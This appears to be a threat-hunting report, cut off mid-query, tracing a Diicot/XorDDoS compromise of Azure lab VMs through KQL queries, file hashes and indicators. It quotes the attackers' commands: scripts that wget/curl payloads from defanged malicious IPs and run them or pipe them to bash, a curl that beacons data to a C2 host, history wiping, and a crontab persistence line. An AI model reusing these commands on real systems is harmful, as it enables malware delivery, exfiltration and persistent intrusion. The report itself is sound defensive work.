# Threat Hunting: Diicot Threat Group

![GfFnrVZW0AA_rfj](https://github.com/user-attachments/assets/0eb91558-e5bf-4f9e-b110-95bd1d56ef2a)
*(Image Credit: WIZ)*

## Executive Summary

This report summarizes the findings of a threat hunting investigation conducted in response to a Microsoft Azure Safeguards Team abuse notice. Microsoft flagged the IP address `20.81.228.191`, associated with the Azure VM `sakel-lunix-2`, for brute-force activity. The investigation confirms the abuse report, identifies the initial compromise point, and details the attacker’s activity within the CyberRange network, including persistence mechanisms, deployed payloads, C2 communication, and lateral movement.

## Validation of Abuse Claim

### Hypothesis:

The virtual machine with public IP `20[.]81[.]228[.]191` has been compromised and is actively conducting brute-force attacks on external public systems from the CyberRange network.

<u>Query</u>

```kql
DeviceInfo
| where PublicIP == "20.81.228.191"
| order by Timestamp asc
| project Timestamp, DeviceName, PublicIP, OSPlatform, LoggedOnUsers
```

Using the the public IP in a query, the device name of the suspected system was discovered to be, `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
After identifying the device associated with the flagged IP address, the next step was to verify if a SSH brute force attack was conducted from the suspected device. Using the device’s name in a new query, the `DeviceNetworkEvents` table was searched.

<u>Query</u>

```kql
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
// Filter for SSH network traffic
| where RemotePort == 22 or InitiatingProcessCommandLine contains "ssh"
| order by Timestamp asc
| project Timestamp, ActionType, RemoteIP, RemotePort, InitiatingProcessCommandLine
```

Thousands of network logs indicating a possible SSH brute force attack were uncovered. However, to conclusively determine that an attack originated from the CyberRange that targeted public IP addresses, further analysis was needed. A new query was created that excluded network traffic directed to the private IPs in the CyberRange.

<u>Query</u>

```kql
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
// Filter out private network addresses
| where RemoteIP !startswith "10." and RemoteIP !startswith "192.168."
| where ActionType == "ConnectionRequest"
| order by Timestamp asc
| project Timestamp, ActionType, RemoteIP, RemotePort, RemoteIPType,InitiatingProcessCommandLine
```

Network traffic consistent with an SSH brute-force attack was observed. The suspected device, `sakel-lunix-2`, began its sequential IP scanning at `2025-03-14T17:46:53.755809Z`. Network logs show that the VM sent over 30,000 connection requests to other systems on port 22. And a closer inspection of the initiating process’s command line revealed a script executing the activity.

<u>Script</u>:

```powershell
./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
```

<u>Script Actions</u>

* Deletes and recreates `/var/tmp/Documents`, likely to remove traces of previous files
* Modifies file attributes using `chattr -iae`, which can make files immutable
* Moves potentially malicious files (`diicot`, `kuak`) into `/var/tmp/Documents`, renames them, and makes them executable
* Removes crontab entries (`crontab -r`), possibly to remove traces of previous persistence mechanisms
* Deletes SSH authorized keys (`~/.ssh/authorized_keys`), likely preventing backdoor access removal
* Kills various processes (`Opera`, `cnrig`, `java`, `xmrig`)
* Downloads a file (`.balu`) from `85[.]31[.]47[.]99` and executes it under the name cache
* Clears command history (`history -c`, `rm -rf .bash_history`)
* Deletes `/tmp/cache`, likely removing execution traces

Analyzing the script reveals several noteworthy actions. It references two non-native executable files, `diicot` and `kuak`, and moves them to a system temporary directory. Since `/var/tmp/` is both writable and temporary, threat actors commonly use it to store and execute malicious files without requiring elevated privileges. Verifying whether the `diicot` or `kuak` files were malicious or not became imperative. To inspect both files, a query was executed using the `DeviceFileEvents` table and file names to retrieve their respective SHA256 hash values for analysis.

<u>Query</u>

```kql
DeviceFileEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where FileName has_any ("diicot", "kuak")
| order by Timestamp asc
```

The query returned the SHA-256 hashes for both files, which were then analyzed using the online public service VirusTotal. The analysis of both hashes confirmed the presence of a
malicious file.

**diicot**
* SHA256: `9462261543bfaf008f4748c76a7a2aec95d67f73315d1adea1833d51f9ec29f6`

**kauk**
* SHA256: `11d43b9ef1678a889cfbca33ca13314d07824753965cafb28d4030644a2c5ccd`

Revisiting the script used in the SSH brute force attack, the script executed both a `curl` and a `wget` command to download a file from the IP address `85[.]31[.]47[.]99`. The script's redundancy on the IP address emphasized the importance of retrieving the file from the designated IP. Analyzing the IP address found in the script using VirusTotal revealed that `85[.]31[.]47[.]99` is classified as a malicious site. Navigating to the “Relations” section on VirusTotal, several domains associated with the malicious IP address were found.

<u>Domains</u>

- digitaldatainsights[.]org
- digital[.]digitaldatainsights[.]org

The `DeviceNetworkEvents` table was queried to determine whether the compromised system had successfully connected to the specified IP address. A thorough inspection of the network logs revealed that no successful connection had occurred. Concluding that no successful connection had occurred, the domain associated with the IP address was used in several queries to search across multiple log tables. Another script was found in the `DeviceEvents` table that explicitly referenced the domain name in the code. The script discovered:

```powershell
#!/bin/bash\nif curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3; then\n curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1\nelse\n curl -s --connect-timeout 15 digital[.]digitaldatainsights[.]org/.x/black3 | bash >/dev/null 2>&1\nfi\n
```

<u>Script Actions</u>

* `curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3`: attempts to fetch a file named black3 from the IP address `196[.]251[.]114[.]67`
* `curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1`: if the first curl attempt is successful, the script pipes the contents of the black3 file directly to bash, which will execute the commands in the file
* If the first server is unreachable, it tries to fetch the payload from the second IP address and again pipes it to bash to execute

A quick inspection of the IP address `196[.]251[.]114[.]67` with VirusTotal reveals that the IP address is classified as malicious as well. Another search of the `DeviceNetworkEvents` table for successful connections with the new, malicious IP address returned no results. Suggesting that the threat actor was also unable to connect to the second IP address. At this stage of the investigation, sufficient artifacts and indicators had been collected and verified to conduct OSINT using available public information. Referencing the malicious files, IP addresses, and script code, a relevant threat report from **WIZ** was identified. The threat report focused on an active malware campaign being undergone by the threat group **Diicot** . The reported Diicot payload names, hashes, and indicators closely matched the activity observed within the CyberRange. Revealing several new indicators for further threat hunting.

*The report: https://www.wiz.io/blog/diicot-threat-group-malware-campaign*

In reference to the WIZ report, another indicator that suggests that the threat actor could possibly be the Diicot threat group, are several instances of Romanian words found in the scripts being utilized. A query utilizing the Romanian phrase `în câmpul` was used to extract logs containing Romanian words.

<u>Query</u>

```kql
DeviceEvents
| where * contains "în câmpul"
| order by Timestamp asc
| project Timestamp, AdditionalFields
```

Romanian in the Script:

```bash
#!/bin/bash\n\ninput_file=\"data.json\"\n\ncat \"$input_file\" | grep OpenSSH > .temp\n# Extragem IP-urile care au \"password\" în câmpul userauth\nawk -F '\"' '/\"ip\":/ {ip=$4} /\"userauth\":/ && /password/ {print ip}' .temp > fenta\n
```

Translated Script:

```bash
#!/bin/bash\n\ninput_file=\"data.json\"\n\ncat \"$input_file\" | grep OpenSSH > .temp\n# Extract the IPs that have \"password\" in the field userauth\nawk -F '\"' '/\"ip\":/ {ip=$4} /\"userauth\":/ && /password/ {print ip}' .temp > fenta\n
```

## Payloads

A notorious file that the Diicot threat group utilizes in their malware campaign is a file named `Update`. This file appears on cloud machines hosted on Azure which run OpenSSH and is typically flagged by a YARA rule for UPX-packed files. Wiz categorizes the file and additional components of the malware as `/var/tmp/.update-logs/Update`. It is identified as the primary payload in Diicot’s attacks. It contains the main logic that includes spreading to other targets, maintaining persistence, and uploading results to the attacker’s server. Typically when executed, it drops an additional two embedded malicious files on the system. Inspecting the known compromised system for a file named similarly, returned a log with not just with the same file name but also the exact folder path as documented Diicot payloads.

<u>Query</u>

```kql
DeviceFileEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where FileName == "Update"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessAccountDomain, InitiatingProcessAccountName, SHA256
```

The log revealed that this file was initiated by the account name `root` in the account domain `sakel-linux-2`. The file’s initiating file process name was `upzbubnv` with the corresponding command line: `./UpzBUBnv`. The hash values of the `Update` file are the following,

* SHA1: `9f1bbb9be5024d24c64b597abe7ede2c8feaccd7`
* SHA256: `5078b85ae87a55d0299682e3123d5c7a804df03266eba49fd404a9cec98470ba`
* MD5: `0342a25887a6943cd325ccda19d3f0df`

These hashes have yet to be labeled as malicious by public online services such as VirusTotal. This is likely a result of a known Diicot technique in which they modify a file’s UPX header. Diicot obfuscates the group’s payloads UPX headers `T1027.002` and corrupts the checksum information in the headers. These techniques are meant to bypass analysis tools and avoid detection by automated systems. Understanding that this was possibly the main payload Diicot utilized, I expanded my search to inspect other systems in the network from 5 months ago with the following query,

<u>Query</u>

```kql
DeviceFileEvents
| where Timestamp >= datetime(2024-11-01)
| where FolderPath == "/var/tmp/.update-logs/Update"
| project Timestamp, DeviceName, ActionType, FolderPath, InitiatingProcessAccountDomain, InitiatingProcessAccountName
```

The query returned three more entries that shared the same file name, folder path, and hashes. The `Update` file was created in three other devices, all initiated by distinct file names and command lines. The following is information of each respective log in chronological order,

---
Device Name: `linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

Time: `2025-03-04T17:52:53.939295Z`

Initiating Process Account Domain: `linux-program-fix`

Initiating Process Account Name: `root`

Initiating Process File Name: `mnflegnm`

Initiating Process Command Line: `./MNFleGNm`

---

Device Name: `linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

Time: `2025-03-07T21:25:14.297296Z`

Initiating Process Account Domain: `linux-programatic-ajs`

Initiating Process Account Name: `root`

Initiating Process File Name: `aqseumky`

Initiating Process Command Line: `./AqsEUmKy`

---

Device Name: `linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

Time: `2025-03-13T05:45:43.568608Z`

Initiating Process Account Domain: `linuxvmdavid`

Initiating Process Account Name: `root`

Initiating Process File Name: `ogbeupss`

Initiating Process Command Line: `./oGBeupSS`

---

Device Name: `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

Time: `2025-03-14T17:47:55.121801Z`

Initiating Process Account Domain: `sakel-lunix-2`

Initiating Process Account Name: `root`

Initiating Process File Name: `upzbubnv`

Initiating Process Command Line: `./UpzBUBnv`

---

To utilize reverse shells in their malware campaigns, Diicot typically uses another malicious file called `/var/tmp/cache`. Which functions as a reverse shell that gives the threat actor a direct remote connection to the compromised machine. Suspecting that the threat actor within the CyberRange could be employing a similar payload, the payload was searched within the CyberRange network.

Query

```kql
DeviceFileEvents
| where Timestamp >= datetime(2024-11-01)
// Filter for suspected, malicious "cache" files in documented file location
| where FolderPath contains "tmp/cache"
| order by Timestamp asc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessAccountDomain, InitiatingProcessAccountName
```

The query returned four logs in total, indicating that four previous devices contained the malicious Update payload. The initiating domain name and account name remained the same for each respective device. In the latest log, the cache file was created by the same Update file found in all four machines. To verify if these files were malicious or not, the SHA256 hash was taken and cross referenced with VirusTotal. Searching the hash with the online database gave me a positive result for the first three files.

Devices:

`linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`,

`linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`,

`linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

Had the malicious cache file with a SHA256 hash of,

SHA256: `0e13e9e4443102bf5b26396b5319f528642b4f0477feb9c7f536fab379b73074`

However the latest cache file created on device, `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net` had a distinct SHA256 hash from the previous iterations, suggesting that the threat actor was employing defense evasion techniques to remain undetected in the network. The SHA256 hash being discussed has a value of,

SHA256: `8c2a00409bad8033fec13fc6ffe4aa4732d80400072043b71ceb57db37244129`

Using VirusTotal again to confirm if the suspected file was malicious or not, resulted in another positive result. Another note to add for the first three created cache files, all three were created with an initiating process command line of,

```bash
scp -qt /tmp/cache
```

Script Actions

`scp` (Secure Copy Protocol) – Used to securely transfer files between systems over SSH

`-q` (Quiet Mode) – Suppresses non-error messages to avoid detection

`-t` (Target Mode) – Indicates that this scp command is running in receive mode, meaning it is expecting a file to be sent to `/tmp/cache`

Another indicator suggesting that the cache files were malicious is that the initiating command executed in silent mode and was actively listening for commands. Understanding the purpose of these files as reverse shells, network connections established by these files were searched for. With the following query,

Query

```kql
DeviceNetworkEvents
| where Timestamp >= datetime(2024-11-01)
| where InitiatingProcessFileName contains "cache"
```

A total of 23 connection requests were observed to the remote IP address `87[.]120[.]114[.]219`, which has been identified as one of Diicot’s command-and-control (C2) servers. VirusTotal was used to verify that the IP address is affiliated with the Diicot malware group. Another malicious file associated with the same Diicot malware campaign, often found alongside the malicious `Update` and `cache` files, is `.bisis`. The `.bisis` payload has a documented folder path of `/var/tmp/.update-logs/.bisis`. Thos malicious file is designed to be a scanner for banner grabbing and identifying systems running OpenSSH. It downloads an IP list from hardcoded URLs, scans port 22 on remote machines for SSH banners and inspects the received responses to discover machines with OpenSSH. Threat actors typically exploit weak SSH credentials to gain an initial access vector into an environment. Using a similar query to the previous one, I inspected all systems in the network starting from November 1, 2024.

Query

```kql
DeviceFileEvents
| where Timestamp >= datetime(2024-11-01)
// Filtering for the "bisis" payload
| where FolderPath == "/var/tmp/.update-logs/.bisis"
| project Timestamp, DeviceName, ActionType, FolderPath, InitiatingProcessAccountDomain, InitiatingProcessAccountName
| order by Timestamp asc
```

The query returned four logs identifying devices that contained the malicious `Update` payload, also held the `.bisis` file.

1. `linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

2. `linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

3. `linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

4. `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

After identifying the affected systems containing the malicious `.bisis` payload, the file's SHA256 hash was cross-referenced with VirusTotal, confirming that the discovered file was indeed malicious. The hashes:

MD5: `5e12f81d5f949dbbd24ab82990a4bc5b`

SHA1: `7f65f650fb8bbc48e803af72b236ebd2f03095a6`

SHA256: `2828ca39e2a5b0fd3b0968bc75b67b4c587a49c13929a6cb050b0989ee01cd22`

VirusTotal identifies the discovered `.bisis` file as belonging to the "portscan" family, aligning with Diicot’s use of the `.bisis` payload as a port scanner.

## Other Indicators of Compromise

Inspecting network activity on device `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net` numerous abnormal activities were logged. Inspecting the `DeviceNetworkEvents` table revealed suspicious network activity originating from a file called `cache`.

Query

```kql
DeviceNetworkEvents
| where Timestamp >= datetime(2024-11-01)
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where * contains "cache"
```

Within the device `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`, malicious activity was conducted. The threat actor begins their activity when the network file is executed at `2025-03-14T17:52:01.898895Z`. The executed file runs a script that sends connection requests to multiple IP addresses within the network.

Script

```bash
./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
```

The script performs multiple malicious actions that include the following activity:

1. Deletes shell history to cover up execution and removes `.bash_history` to erase evidence of past commands

2. Removes immutable attributes on the SSH keys

3. Removes scheduled cron jobs, possibly to disable security or existing admin jobs

4. Kills multiple processes

5. Downloads a suspicious binary `(.balu)` from an external IP `(85[.]31[.]47[.]99)` and renames it to 'cache'

6. Moves files into hidden directories (`.diicot`, `kuak`) `chmod +x .*` makes all hidden files executable, possibly including additional malware

The `network` file’s observed activity also appears to mimic documented behavior of Diicot’s `.bisis` payload. Where the file sends connection requests to other systems on port 22, possibly looking for specific responses that indicate the presence of OpenSSH. The public IP address found in the script is classified as malicious by VirusTotal. 

The file location of the network file is `/dev/shm/.x/network` and with the payload being initiated by the `root` user in the `sakel-lunix-2` domain. The discovered `network` payload has a SHA256 hash value of,

SHA256: `cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255`

This file has not yet been flagged as malicious by public online services, such as VirusTotal, at the time of this report. Expanding my search within the CyberRange network for the script, uncovered other systems containing it

Query

```kql
DeviceFileEvents
| where Timestamp >= datetime(2024-11-01)
| where SHA256 == "cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255"
| order by Timestamp asc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessAccountDomain, InitiatingProcessAccountName
```

The query revealed that the script was also present in three other systems, the device being,

1. `linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

2. `linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

3. `linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

Other suspicious activity also occurs at `2025-03-14T17:52:01.898895Z` when the threat actor executes the cache file initiating a connection request to a known Diicot C2 server. And another instance of suspicious behavior occurs at `2025-03-14T18:23:35.941725Z` when the threat actor executes the command,

```bash
curl --silent http://196[.]251[.]73[.]38:47/save-data?IP=45[.]64[.]186[.]20 -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Accept-Language: en-US,en;q=0.9" -H "Cache-Control: max-age=0" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" --insecure
```

The command sends the IP address `45[.]64[.]186[.]20` to the remote IP address of `196[.]251[.]73[.]38` on port 47. Suggesting that there is possible data exfiltration, tracking, or botnet communication occurring. Referencing the remote IP address to VirusTotal returned a positive malicious affiliated IP address.

One other indicator of compromise discovered in association with the newly created cron job `gcc.sh` (Persistence Mechanism section) trojan, is the initiating file called `ygljglkjgfg0`. This file is responsible for initiating the creation of the malicious scheduled job on several systems. Using a query, the entirety of the network was searched for systems hosting files with the same name.

Query

```kql
DeviceFileEvents
| where Timestamp >= datetime(2024-11-01)
| where FileName == "ygljglkjgfg0"
| order by Timestamp asc
| project Timestamp, DeviceName, ActionType, SHA256
```

Interestingly, the returned logs revealed seven distinct SHA256 hashes present on all known compromised systems hosting. The hashes were then cross referenced using VirusTotal and the results were mixed. Some of the hashes were classified as malicious, while others were not. Possibly indicating that publicly, undetected malware was present in some systems. The affected devices were as followed,

1. `ff-vm-lx-224-base.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

2. `linux-vm-vulnerablity-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

3. `linux-vulnmgmt-kobe.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

4. `lab-linux-vuln.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

5. `linux-moh-jan.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

6. `linux-vm-vun-test-zay.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

7. `linuxvmvulnerability-test-corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

And the seven distinct hashes and their VirusTotal results are,

1. `3c1f9f07eacc2f057a609c955e2fde38493521268f3493717ffa5a31b261f3ef` *(Malicious)*

2. `99f9ec2cd5cee445830b5500fecbb37861a06c50b174d0d8635c14ffeb236c9d` *(Not Flagged)*

3. `6ddf688bdf16a1d465aef954ff90b372dacd8162bac2c7797ff7b6b4f20afcbc` *(Malicious)*

4. `268132cf61dfb55c5ebb7ef34a58c915442949b92f645c6f28887ceca5c6c19d` *(Not Flagged)*

5. `2f70458e2b77fba49697e3fbba8bea53e27e7ca010fd92ca3919b819d3aee160` *(Malicious)*

6. `0e817a2325c215997de15851152a66924874739eeff5da4b434e5d36c83a76eb` *(Malicious)*

7. `75bfd448e4274cc4e5804c43768f62a36ccb3fc3b1df06e14d9c892daa2cde19` *(Malicious)*

Reviewing the returned VirusTotal results indicated that the `ygljglkjgfg0` payload found on the compromised devices are associated with Linux Trojans called `XorDDoS`. `XorDDoS` Trojans are a Linux-based malware that has been observed in DDoS botnet campaigns. It is known for using XOR-based encryption to evade detection and is often deployed to compromise Linux servers through SSH brute-force attacks. Conscious that there could be more `XorDDos` Trojans in the network, a query using all seven distinct SHA256 hashes was crafted.

Query

```kql
DeviceFileEvents
| where Timestamp >= datetime(2024-11-01)
| where SHA256 in
("3c1f9f07eacc2f057a609c955e2fde38493521268f3493717ffa5a31b261f3ef",
"99f9ec2cd5cee445830b5500fecbb37861a06c50b174d0d8635c14ffeb236c9d",
"6ddf688bdf16a1d465aef954ff90b372dacd8162bac2c7797ff7b6b4f20afcbc",
"268132cf61dfb55c5ebb7ef34a58c915442949b92f645c6f28887ceca5c6c19d",
"2f70458e2b77fba49697e3fbba8bea53e27e7ca010fd92ca3919b819d3aee160",
"0e817a2325c215997de15851152a66924874739eeff5da4b434e5d36c83a76eb",
"75bfd448e4274cc4e5804c43768f62a36ccb3fc3b1df06e14d9c892daa2cde19")
| distinct DeviceName
```

The query returned nine devices that had a file containing at least one of the XorDDoS Trojan's SHA256 hashes.

1. `linux-vm-vulnerablity-test`

2. `ff-vm-lx-224-base.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

3. `linux-vm-vulnerablity-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

4. `linux-vulnmgmt-kobe.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

5. `linux-caleb-programmatic.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

6. `lab-linux-vuln.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

7. `linux-moh-jan.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

8. `linux-vm-vun-test-zay.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

9. `linuxvmvulnerability-test-corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

## Diicot Techniques

File Obfuscation (T1027.002)
As previously mentioned, Diicot uses file obfuscation to obfuscate the UPX headers of their
payloads. For example, the malicious "Update" file's UPX header has been observed to be
deliberately obfuscated to evade detection by analysis tools and automated systems.
Reverse Shell
Diicot is known to employ reverse shells in their malware campaigns. This functionality is
typically done through one of the payloads dropped on the compromised system. Once the
payload is executed, a reverse shell connects back to the attacker’s command-and-control (C2)
server. Allowing the attacker to execute arbitrary commands remotely on the infected machine.
The “cache” files served as reverse shells in this incident, attempting to connect to Diicot’s C2
server. Filtering the network logs in DeviceNetworkEvents for logs where the cache file was
the initiating file, returned activity resembling reverse shell activity.
Query
DeviceNetworkEvents
| where InitiatingProcessFileName contains "cache"
| order by Timestamp asc
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteIPType,
InitiatingProcessFileName
Persistence Mechanism (T1053.003)
Diicot has been documented modifying the crontab to schedule recurring tasks to gain
persistence on a system. This is done with the main, malicious “Update” payload. Diicot
typically creates four different tasks to gain persistence on a system. The documented tasks
Diicot is know to use are,
1. Update - re-runs the payload itself
2. History - a Bash script is used to check if “Update” is running and runs it again if
needed
3. .b - a Bash script is used to check if “cache” is running and runs it again if needed
4. .c - downloads and runs a bash script from the URL:
digital[.]digitaldatainsights[.]org/.x/black3
Aware that the crontab is being leveraged by the threat actor for persistence, I queried initiating
process command lines that contained the term “crontab.”
Query
DeviceProcessEvents
| where Timestamp >= datetime(2024-11-01)
| where InitiatingProcessCommandLine contains "crontab"
| order by Timestamp asc
| distinct InitiatingProcessCommandLine
Several commands were returned that indicated both highly suspicious activity and scripts being
conducted on numerous systems.An example of commands executing cron jobs for persistence
is:
sh -c "sed -i '/\/etc\/cron.hourly\/gcc.sh/d' /etc/crontab && echo '*/3 * * * * root
/etc/cron.hourly/gcc.sh' >> /etc/crontab"
Explanation
● /\/etc\/cron.hourly\/gcc.sh/d - tells sed to delete any line that contains
/etc/cron.hourly/gcc.sh in it
● d - command means "delete the matching line”
● echo '*/3 * * * * root /etc/cron.hourly/gcc.sh' >> /etc/crontab - command appends a
new cron job to the /etc/crontab file and runs the scheduled task every 3 minutes under
the “root” user
The devices that have been logged executing this command with the execution time, are:
Time: 2025-02-26T00:23:35.944642Z
Device: linux-vulnmgmt-kobe.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-02-26T04:20:39.481444Z
Device: linux-vm-vulnerablity-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-02-27T22:30:28.265571Z
Device: lab-linux-vuln.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-03-03T22:19:08.672632Z
Device: linux-vm-vun-test-zay.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-03-06T22:34:07.086385Z
Device: linux-moh-jan.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-03-20T04:27:05.576081Z
Device: linuxvmvulnerability-test-corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Recognizing that the threat actor was replacing the original gcc.sh file with a potentially
malicious one, inspection of the newly created gcc.sh provided the relevant SHA256 hash,
SHA256: 74d31cac40d98ee64df2a0c29ceb229d12ac5fa699c2ee512fc69360f0cf68c5
The gcc.sh payloadss are flagged as malicious by VirusTotal with the file being labeled a
Trojan.
To double-check which systems were affected, the following query was executed,
Query
DeviceFileEvents
| where Timestamp >= datetime(2024-11-01)
| where SHA256 ==
"74d31cac40d98ee64df2a0c29ceb229d12ac5fa699c2ee512fc69360f0cf68c5"
| order by Timestamp asc
| project Timestamp, DeviceName, ActionType, InitiatingProcessFileName
The devices and the time of creation of the Trojans are as follows,
Time: 2025-02-25T04:20:37.673433Z
Device: ff-vm-lx-224-base.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-02-26T00:23:35.936362Z
Device: linux-vulnmgmt-kobe.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-02-26T04:20:39.477883Z
Device: linux-vm-vulnerablity-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-02-27T22:30:28.262111Z
Device: lab-linux-vuln.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-03-03T22:19:08.664826Z
Device: linux-vm-vun-test-zay.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-03-06T22:34:07.076726Z
Device: linux-moh-jan.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
Time: 2025-03-20T04:27:05.565158Z
Device: linuxvmvulnerability-test-corey.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
The creation of the gcc.sh Trojan on the systems were all initiated by the same file name called
ygljglkjgfg0. Referencing the SHA256 hash of ygljglkjgfg0 indicated the files are classified
“XorDDoS” Trojans on VirusTotal.
Referring back to documented Diicot persistence techniques, I focused on threat hunting for
documented cron jobs that the threat group has been observed to utilize in their malware
campaigns. The DeviceFileEvents table was searched to locate the .b cron job, which Diicot
commonly uses for persistence.
Query
DeviceFileEvents
| where Timestamp >= datetime(2024-11-01)
| where FileName == ".b"
| order by Timestamp asc
The query yielded several notable logs. To confirm whether the queried file was malicious or
associated with Diicot’s “Update” file, its SHA256 hash was referenced in a VirusTotal query.
VirusTotal associated the discovered .b task as one of the embedded files found in the main
malicious payload Update. The SHA256 hash of the .b file is,
SHA256: a9a4f021f91d1f35888c4e2fe7d2af2d458de8c8aba4f5815f1ed3125650c28f
Using the following query, the next step was to identify which devices contained the crontab.
Query
DeviceFileEvents
| where SHA256 ==
